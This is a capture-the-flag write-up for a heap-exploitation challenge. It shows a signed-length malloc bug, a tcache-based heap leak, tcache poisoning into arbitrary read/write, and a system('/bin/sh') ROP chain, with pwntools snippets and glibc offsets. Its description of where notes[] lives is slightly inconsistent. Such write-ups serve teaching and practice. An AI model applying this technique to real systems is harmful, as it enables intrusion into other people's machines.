# Dead Network

| | |
|---|---|
| **CTF** | BCS CTF 2026 |
| **Category** | Pwn |
| **Difficulty** | Medium |
| **Points** | 477 (13 solves) |
| **Author** | 0xblackfox |
| **File** | `deadnet` (glibc 2.35 / Ubuntu 22.04) |
| **Flag** | `bcsctf{h0us3_0f_1N_aLL_f0rc3_0n_th3_d34d_n37w0rk}` |

## Challenge

> Year 2026. The dead internet theory won. What remains of the network is a perimeter of filter
> nodes that terminate machine traffic on sight. You found one node still serving its note
> vault. It speaks an undocumented handshake and kills anyone who hesitates.
>
> Server: `nc 172.16.38.22 6655`

## TL;DR

A note vault (Full RELRO, canary, NX, PIE) behind a "prove you are human" handshake that hands
you the **PIE base for free** and enforces a **10-second deadline**. The vault keeps three
notes as `notes[i] = malloc(len + 0x40)`, but reads the *body* of a note at `notes[i] + 0x40`.
Feed a **negative** length and `malloc` hands back a 0x20 chunk while the body pointer still
sits 0x40 further on - so a note's "Content" is really **two chunks into the heap**. Freeing
that chunk exposes its safe-linked tcache `fd` through a neighbour's `Content`, giving a heap
leak for free; overflowing the title (`fgets(...,0x3f,...)`, unrelated to the real chunk size)
then poisons tcache onto the **global `notes[]` array**, which upgrades the OOB read into full
**arbitrary read/write**. From there: `puts@GOT` -> libc, `environ` -> stack, and a scan for the
one fixed return address `main`'s dispatch loop pushes on every action. Pointing a note at
that stack slot and overflowing the title again writes a `system("/bin/sh")` ROP chain over
`edit()`'s own return address.

## Binary analysis

```
$ checksec deadnet
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

`main()` calls `setup()` -> `gate()` -> `build_menu()` -> a loop over `menu()`.

Globals (BSS):

```c
void   *notes[3];    // @ 0x5030   malloc'd in main, 0x18 bytes, memset 0
size_t  sizes[3];    // @ 0x5038
uint64_t tags[3];    // @ 0x5040
int     total_cnt;   // @ 0x5048   capped at 3
int     left;        // @ 0x504c   scanf's "%d" leftover
uint8_t gate_token[16]; // @ 0x5050
int     disp[6];     // @ 0x5060   shuffled menu numbering
```

`setup()` sets stdin/stdout unbuffered and installs `on_alarm` (a bare `_exit`) for `SIGALRM`.
`main()` then does `alarm(120)` - that is the real time budget for the whole exploit.

## The gate: free PIE leak, 16-byte XOR handshake, 10s deadline

`gate()` reads 16 bytes from `/dev/urandom` into `gate_token`, prints them, and prints a
"diagnostics" address:

```
====================================================
  BCSCTF{2026} Dead Internet Protector
[*] Diagnostics: system() @ 0x55a3f2c1d3c9
[*] Prove you are human.
[*] Token: 8f3c1a... (32 hex chars)
```

The "diagnostics" address is not `system()` - it is `slop_filter_ai` (an unused function that
prints `Neural signature matched: terminating....` and exits), at **`pie_base + 0x13c9`**. So:

```python
pie_base = leaked_addr - 0x13c9
```

The verification loop, reversed from `0x1660`:

```c
alarm(10);                                   // <- "kills anyone who hesitates"
read_exactly(16 bytes from stdin);
alarm(0);
for (i = 0; i < 16; i++)
    if ((buf[i] ^ i ^ 0x13) != gate_token[i]) return 0;   // any mismatch -> bail
return 1;
```

which inverts to a one-liner:

```python
resp = bytes(tok[i] ^ i ^ 0x13 for i in range(16))
```

Answer correctly and you get `[+] human verified. welcome to the vault.`

Two things to internalise here:

- The banner prints the token **before** waiting for input, so the whole exchange is one
  round trip - but the 10-second `alarm` means you cannot dither or retry. Parse and reply in
  a single `send`.
- Failing is not punished by a message, just by never getting the menu.

`build_menu()` then shuffles the six option numbers **per connection**. The seed is derived
from the token itself:

```c
unsigned seed = 0x1337;
for (i = 0; i < 16; i++) seed = seed * 0x83 + gate_token[i];
srand(seed);
/* Fisher-Yates over {1,2,3,4,5,6} */
```

Since the token is fresh random bytes every connection, the option numbers change every time,
so the exploit parses `"<n>) Add a note"` out of the banner rather than hard-coding them.

## The bug: signed length, unsigned body pointer

`add()` (`0x1980`), abridged:

```c
if (total_cnt == 3) { puts("There is no space."); return; }
fgets(buf, 0x20, stdin);
long len = strtoll(buf, NULL, 0);              // SIGNED
char *p = malloc(len + 0x40);                  // len + 0x40 wraps for negative len
fgets(p, 0x3f, stdin);                         // title
printf("Input note body: ");
fgets(p + 0x40, len, stdin);                   // body, at a FIXED +0x40
unsigned long tag = strtoull(buf, NULL, 0);
/* first free slot in notes[0..2] */
notes[i] = p;  sizes[i] = len + 0x40;  tags[i] = tag;  total_cnt++;
```

and `print()` (`0x1fa4`):

```c
printf("Title: %s\n",   notes[i]);        // p
printf("Content: %s\n", notes[i] + 0x40); // p + 0x40   <-- the gap
```

The body is **always** read and printed at `p + 0x40`, regardless of how big the allocation
actually was. With `len = -0x30` we get `malloc(0x10)` = a 0x20 chunk, but `p + 0x40` is 0x40
past the chunk start - squarely into unrelated heap memory. Three of these in a row land the
notes at consecutive 0x20 chunks `M`, `V`, `F`, and since chunk addresses are 0x20 apart:

```
M = X          M+0x40 = X+0x40 = F      -> M's "Content" IS F's first 8 bytes
V = X+0x20
F = X+0x40
```

So freeing `F` writes tcache metadata directly into the bytes that `M`'s `Content` prints.
(There is a second bug in the same line: `fgets(p + 0x40, len, stdin)` passes the *signed*
`len` as `size_t`, so a negative length is a ~2^64 "read until newline" - unbounded. The solve
doesn't need it.)

Note the bounds asymmetry that matters: `delete`/`edit` reject `i > 2`, but `print` does
**not** bounds-check `i` at all (`mov edx, [rbp-0xc]; mov edx, edx; shl rdx, 3` - a zero-extend
straight into `notes[i]`), so a wild index is an OOB read of the pointer array. Unused here,
but worth knowing it's there.

## Leak: the safe-linked tcache `fd` is a page number

When `F` is freed into `tcache[0x20]` it is the only entry, so glibc's safe-linking reduces to:

```c
F->fd = protect(F, NULL) = (F >> 12) ^ 0 = F >> 12;
```

The "pointer" we read out is therefore not obfuscated at all - it is literally `F >> 12`.
Shifting it back up recovers the page:

```python
raw   = re.search(rb"Content: ([^\n]*)", show(0)).group(1)
heap  = u64(raw.ljust(8, b"\x00")[:8]) << 12
```

No brute force, no unlink, no leak grooming. `notes[]` itself sits at a fixed
`heap + 0x2a0` on this build (libc's own startup allocations - `srandom`'s state table among
them - push the three 0x18 arrays there), which is the one number in this writeup worth
re-deriving rather than trusting if the environment shifts.

## Poison: tcache 0x20 -> the global `notes[]`

Free `V` as well, so `tcache[0x20]` is `V -> F`. The title write is the second primitive:

```c
/* edit(), option 1 */
fgets(notes[i], 0x3f, stdin);     /* fixed 0x3f - never compared to the real chunk size */
```

0x3f bytes into a 0x20 chunk is a 0x1f overflow, which is more than enough to reach `V`'s `fd`
and rewrite it as a safe-linked pointer to `notes[]`:

```python
delete(1)                                    # tcache[0x20]: V -> F
edit_title(0, b"A"*0x20 + p64(protect(heap + 0x30, notes_arr)))
add(-0x30, b"x")                            # malloc #1 -> V
add(-0x30, p64(puts_got) + p64(0) + p64(notes_arr))   # malloc #2 -> notes_arr  !!
```

The second `add` allocates **the global `notes[]` array itself** as a note, so what the program
believes is its note table is now heap data we wrote: `notes[0] = puts_got`, `notes[2] = notes_arr`.

That single allocation gives both primitives at once:

```python
def set_n0(addr):                      # arbitrary write: repoint notes[0]
    edit_title(1, p64(addr) + p64(notes_arr) + p64(notes_arr))

def read64(addr):                      # arbitrary read: print notes[0]'s "Title"
    set_n0(addr)
    return u64(re.search(rb"Title: ([^\n]*)", show(0)).group(1).ljust(8, b"\x00")[:8])
```

Editing note 1 rewrites `notes[0..2]` (its content pointer *is* `notes_arr`); printing note 0
then `printf("%s")`s from whatever `notes[0]` points at.

## libc, stack, and the return slot

```python
libc.address = read64(PIE + 0x4f48) - libc.sym.puts   # 0x80e10 on glibc 2.35
environ     = read64(libc.sym.environ)               # 0x222200
```

Every menu action is dispatched from one place in `main()`, so `call <action>` always pushes its
return address into the *same* stack slot. The value in that slot depends on which function is
currently executing, but the *address* of the slot does not - `main`'s frame is fixed:

```
21f4: call edit     ; 21f9: jmp 221d     <- 0x21f9 sits in the slot while edit() runs
2202: call print    ; 2207: jmp 221d     <- 0x2207 sits in the slot while print() runs
```

So we scan down from `environ` looking for the value we can *observe* (our reads happen inside
`print`), then do the overflow from inside `edit`:

```python
target_ret = PIE + 0x2207
for off in range(0x8, 0x600, 8):
    if read64(environ - off) == target_ret:
        S = environ - off
        break
```

`S` is a stack address we can name but not dereference, which is fine: `set_n0(S)` makes note 0
*point at the slot*, so `edit_title(0, chain)` writes straight over the saved return address.
When `edit()` returns it "returns" into the chain:

```python
chain = p64(pop_rdi) + p64(binsh) + p64(ret) + p64(libc.sym.system)
```

(the bare `ret` is stack-alignment padding for the `system` call). The flag is then one
`cat` away - `start.sh` does `cd /script`, and the Dockerfile leaves `flag.txt` mode `440`
`root:error`, readable by the `error` user xinetd runs us as.

## Solution

[`solve.py`](solve.py) automates all of it (needs `pwntools`):

```
$ python3 solve.py remote
[+] PIE base = 0x578007449000
[+] heap base = 0x578044295000
[+] libc base = 0x748e6f5ff000
[+] environ (stack) = 0x7fff457819e8
[+] saved-return slot S = 0x7fff457818a8
bcsctf{h0us3_0f_1N_aLL_f0rc3_0n_th3_d34d_n37w0rk}
```

Offsets for the target's glibc 2.35 (`2.35-0ubuntu3.15`):

| symbol | offset |
|---|---|
| `puts` | `0x80e10` |
| `system` | `0x50d70` |
| `environ` | `0x222200` |
| `"/bin/sh"` | `0x1d8678` |
| `pop rdi ; ret` | `0x2a3e5` |
| `ret` | `0x29cd6` |

## Pitfalls

- **Do not hunt for the libc base by probing memory.** The obvious move - scan downward from
  `puts@GOT` in 0x1000 steps looking for `\x7fELF` - **kills the connection**, because
  `print` does `printf("%s", notes[0])` and an unmapped page is a `SIGSEGV` in the server, not
  a zero. Fingerprint instead using the GOT, which is guaranteed mapped: every libc GOT entry
  gives a *delta*, and `free - puts` / `printf - puts` matching a candidate libc identifies the
  build without ever touching an unmapped address. On this target both deltas matched
  `2.35-0ubuntu3.15` exactly.
- **`EI_OSABI` is `0x03`, not `0x00`.** Verifying a candidate libc base by comparing the first
  eight bytes against `\x7fELF\x02\x01\x01\x00` rejects the *correct* libc, and the resulting
  base is page-aligned and looks completely plausible - so it reads as "the remote is a
  different glibc build" and sends you off downloading the wrong `.deb`. The real header is
  `7f454c4602010103`. Comparing a truncated 7-byte magic, or better, just checking the
  `\x7fELF` prefix, avoids the whole trap.
- **`fgets` stops at `\n`, so the ROP chain must not contain a `0x0a` byte.** libc addresses
  are effectively random, so roughly one chain in 256 will have a newline in it; the solve
  asserts on this rather than discovering it as a silently truncated payload.
- **The scan value and the overwritten value are legitimately different** (`PIE+0x2207` while
  scanning in `print`, `PIE+0x21f9` while overflowing in `edit`). It is tempting to think the
  scan "found the wrong slot" when the value read back no longer matches what was searched
  for; the slot *address* is what must be stable, and it is, because `main`'s frame never moves.
- **The handshake is on a 10-second fuse, the vault on 120.** Parse the banner and reply in one
  shot; a retry after a mis-parse is not an option, because the process is already gone.
- **`notes[]` at `heap + 0x2a0` is empirical.** It depends on how much heap libc's own startup
  consumed (`srandom`'s state table is allocated by the `srand` in `build_menu`). It is stable
  for this binary + glibc, but it is the one constant in the chain to re-derive rather than
  copy if anything about the environment moves.

## Takeaways

- A signed length feeding `malloc(len + 0x40)` while the *stored* pointer arithmetic stays
  fixed at `+0x40` is a two-sided bug: the allocation shrinks, the access does not. Reading
  the disassembly for where a pointer is *used* rather than where it was *set* is what exposes
  it.
- glibc's safe-linking looks like it randomises a freed chunk's `fd`, but a **single-entry**
  tcache reduces it to `ptr >> 12` - which is a *better* leak than a raw pointer, not a worse
  one. Freeing into an empty bin is the cheapest heap leak in modern glibc.
- A "read back what I wrote" feature whose read offset is hard-coded rather than derived from
  the allocation size is an OOB primitive by construction, and here it survived all the way to
  an arbitrary write on a `notes[]` table that lives in BSS.
- Overwriting a heap pointer with a pointer to *another heap object's own metadata* (the
  `notes[]` array) converts a bounded overflow into a read/write oracle over the whole
  address space - and the array in question is one the program trusts completely.
- When a fixed-offset leak looks "almost right" (aligned, plausible, single byte off),
  suspect the *checker* before the target: a wrong magic constant and a version mismatch look
  identical from the outside.
